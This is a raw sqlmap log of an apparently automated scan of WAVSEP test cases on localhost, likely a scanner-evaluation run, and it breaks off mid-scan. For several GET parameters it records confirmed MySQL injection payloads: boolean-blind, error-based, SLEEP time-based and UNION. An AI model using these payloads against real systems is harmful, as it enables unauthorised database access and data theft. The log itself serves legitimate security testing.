[04:48:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:48:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:48:32] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:48:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:48:32] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:48:32] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:48:32] [INFO] testing 'Generic inline queries'
[04:48:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:48:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:48:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:48:32] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:48:32] [INFO] GET parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:48:32] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:48:32] [INFO] GET parameter 'username' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:48:32] [INFO] testing 'MySQL inline queries'
[04:48:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:48:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:48:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:48:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:48:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:48:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:48:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:48:42] [INFO] GET parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:48:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:48:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:48:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:48:43] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:48:43] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:48:43] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:48:43] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:48:43] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:48:43] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:48:43] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:48:43] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:48:43] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:48:43] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:48:43] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:48:44] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1198 HTTP(s) requests:
---
Parameter: username (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=textvalue' RLIKE (SELECT (CASE WHEN (2453=2453) THEN 0x7465787476616c7565 ELSE 0x28 END))-- hxIL

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: username=textvalue' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71706a6271,(SELECT (ELT(9556=9556,1))),0x716a707671,0x78))s), 8446744073709551610, 8446744073709551610)))-- Iihn

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=textvalue' AND (SELECT 2316 FROM (SELECT(SLEEP(5)))nsDc)-- AkVe
---
do you want to exploit this SQL injection? [Y/n] Y
[04:48:44] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[23/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp?msg=textvalue
do you want to test this URL? [Y/n/q]
> Y
[04:48:44] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case04-InjectionInUpdate-String-CommandInjection-With200Errors.jsp?msg=textvalue'                                                                                                         
[04:48:44] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=610EE835C48...FB18E08F1D'). Do you want to use those [Y/n] Y
[04:48:44] [INFO] testing if GET parameter 'msg' is dynamic
[04:48:44] [WARNING] GET parameter 'msg' does not appear to be dynamic
[04:48:44] [INFO] heuristic (basic) test shows that GET parameter 'msg' might be injectable (possible DBMS: 'MySQL')
[04:48:45] [INFO] heuristic (XSS) test shows that GET parameter 'msg' might be vulnerable to cross-site scripting (XSS) attacks
[04:48:45] [INFO] testing for SQL injection on GET parameter 'msg'
[04:48:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:48:45] [WARNING] reflective value(s) found and filtering out
[04:48:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:48:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:48:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:48:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:48:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:48:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:48:47] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:48:47] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:48:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:48:47] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:48:47] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:48:47] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:48:47] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:48:48] [INFO] testing 'Generic inline queries'
[04:48:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:48:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:48:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:48:48] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:48:48] [INFO] GET parameter 'msg' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:48:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:48:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:48:48] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:48:48] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:48:48] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:48:48] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:48:48] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:48:48] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:48:48] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:48:48] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:48:48] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:48:48] [INFO] GET parameter 'msg' is 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' injectable 
[04:48:48] [INFO] testing 'MySQL inline queries'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:48:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:48:48] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[04:48:48] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)'
[04:48:48] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query)'
[04:48:48] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK)'
[04:48:48] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query)'
[04:48:48] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (BENCHMARK - comment)'
[04:48:48] [INFO] testing 'MySQL > 5.0.12 AND time-based blind (heavy query - comment)'
[04:48:48] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (BENCHMARK - comment)'
[04:48:48] [INFO] testing 'MySQL > 5.0.12 OR time-based blind (heavy query - comment)'
[04:48:48] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[04:49:18] [INFO] GET parameter 'msg' appears to be 'MySQL >= 5.0.12 RLIKE time-based blind' injectable 
[04:49:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:49:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:49:19] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:49:19] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:49:19] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:49:19] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:49:19] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:49:19] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:49:19] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:49:19] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:49:19] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:49:20] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:49:21] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'msg' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1194 HTTP(s) requests:
---
Parameter: msg (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msg=textvalue' RLIKE (SELECT (CASE WHEN (9667=9667) THEN 0x7465787476616c7565 ELSE 0x28 END))-- QyUj

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: msg=textvalue' AND EXTRACTVALUE(4028,CONCAT(0x5c,0x716b786271,(SELECT (ELT(4028=4028,1))),0x716a716b71))-- hxIn

    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: msg=textvalue' RLIKE SLEEP(5)-- LtbL
---
do you want to exploit this SQL injection? [Y/n] Y
[04:49:21] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.1
[24/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=msgid
do you want to test this URL? [Y/n/q]
> Y
[04:49:21] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case05-InjectionInSearchOrderBy-String-BinaryDeliberateRuntimeError-With200Errors.jsp?orderby=msgid'                                                                                      
[04:49:21] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=1761E16371B...3DC226CB86'). Do you want to use those [Y/n] Y
[04:49:21] [INFO] testing if GET parameter 'orderby' is dynamic
[04:49:21] [WARNING] GET parameter 'orderby' does not appear to be dynamic
[04:49:21] [INFO] heuristic (basic) test shows that GET parameter 'orderby' might be injectable (possible DBMS: 'MySQL')
[04:49:21] [INFO] heuristic (XSS) test shows that GET parameter 'orderby' might be vulnerable to cross-site scripting (XSS) attacks
[04:49:21] [INFO] testing for SQL injection on GET parameter 'orderby'
[04:49:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:49:21] [WARNING] reflective value(s) found and filtering out
[04:49:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:49:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:49:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:49:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:49:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:49:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:49:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:49:24] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:49:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:49:24] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:49:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:49:24] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:49:24] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:49:24] [INFO] testing 'Generic inline queries'
[04:49:24] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:49:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:49:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:49:25] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:49:25] [INFO] GET parameter 'orderby' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:49:25] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:49:25] [INFO] GET parameter 'orderby' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:49:25] [INFO] testing 'MySQL inline queries'
[04:49:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:49:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:49:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:49:25] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:49:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:49:25] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:49:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:49:35] [INFO] GET parameter 'orderby' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:49:35] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:49:35] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:49:35] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:49:35] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:49:36] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:49:36] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:49:36] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:49:36] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:49:36] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:49:36] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:49:36] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:49:36] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:49:36] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:49:36] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:49:37] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'orderby' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1233 HTTP(s) requests:
---
Parameter: orderby (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: orderby=msgid RLIKE (SELECT (CASE WHEN (1853=1853) THEN 0x6d73676964 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: orderby=msgid AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a627a71,(SELECT (ELT(9017=9017,1))),0x717a787171,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: orderby=msgid AND (SELECT 8309 FROM (SELECT(SLEEP(5)))xyHj)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:49:37] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[25/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[04:49:37] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case06-InjectionInView-Numeric-PermissionBypass-With200Errors.jsp?transactionId=132'                                                                                                      
[04:49:37] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=4A9775F642A...E54860D68C'). Do you want to use those [Y/n] Y
[04:49:37] [INFO] testing if GET parameter 'transactionId' is dynamic
[04:49:37] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[04:49:37] [INFO] heuristic (basic) test shows that GET parameter 'transactionId' might be injectable (possible DBMS: 'MySQL')
[04:49:37] [INFO] heuristic (XSS) test shows that GET parameter 'transactionId' might be vulnerable to cross-site scripting (XSS) attacks
[04:49:37] [INFO] testing for SQL injection on GET parameter 'transactionId'
[04:49:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:49:37] [WARNING] reflective value(s) found and filtering out
[04:49:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:49:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:49:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:49:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:49:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:49:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:49:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:49:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:49:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:49:40] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:49:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:49:40] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:49:40] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:49:41] [INFO] testing 'Generic inline queries'
[04:49:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:49:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:49:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:49:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:49:42] [INFO] GET parameter 'transactionId' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:49:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:49:42] [INFO] GET parameter 'transactionId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:49:42] [INFO] testing 'MySQL inline queries'
[04:49:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:49:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:49:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:49:42] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:49:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:49:42] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:49:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:49:52] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:49:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:49:52] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:49:52] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:49:52] [INFO] target URL appears to have 4 columns in query
[04:49:52] [INFO] GET parameter 'transactionId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 793 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionId=132 RLIKE (SELECT (CASE WHEN (6643=6643) THEN 132 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionId=132 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170716b71,(SELECT (ELT(2442=2442,1))),0x7178786271,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 4200 FROM (SELECT(SLEEP(5)))LqEB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionId=132 UNION ALL SELECT NULL,CONCAT(0x7170716b71,0x787a43784e5462594468764f4344726450644261474c4c554161524f4b6d776c7a755a695162656f,0x7178786271),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:49:52] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[26/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp?msgId=1
do you want to test this URL? [Y/n/q]
> Y
[04:49:52] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case07-InjectionInSearch-Numeric-UnionExploit-With200Errors.jsp?msgId=1'                                                                                                                  
[04:49:52] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=E203B3CBCDC...335023A524'). Do you want to use those [Y/n] Y
[04:49:52] [INFO] testing if GET parameter 'msgId' is dynamic
[04:49:52] [WARNING] GET parameter 'msgId' does not appear to be dynamic
[04:49:52] [INFO] heuristic (basic) test shows that GET parameter 'msgId' might be injectable (possible DBMS: 'MySQL')
[04:49:52] [INFO] heuristic (XSS) test shows that GET parameter 'msgId' might be vulnerable to cross-site scripting (XSS) attacks
[04:49:52] [INFO] testing for SQL injection on GET parameter 'msgId'
[04:49:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:49:52] [WARNING] reflective value(s) found and filtering out
[04:49:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:49:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:49:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:49:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:49:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:49:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:49:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:49:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:49:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:49:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:49:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:49:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:49:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:49:55] [INFO] testing 'Generic inline queries'
[04:49:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
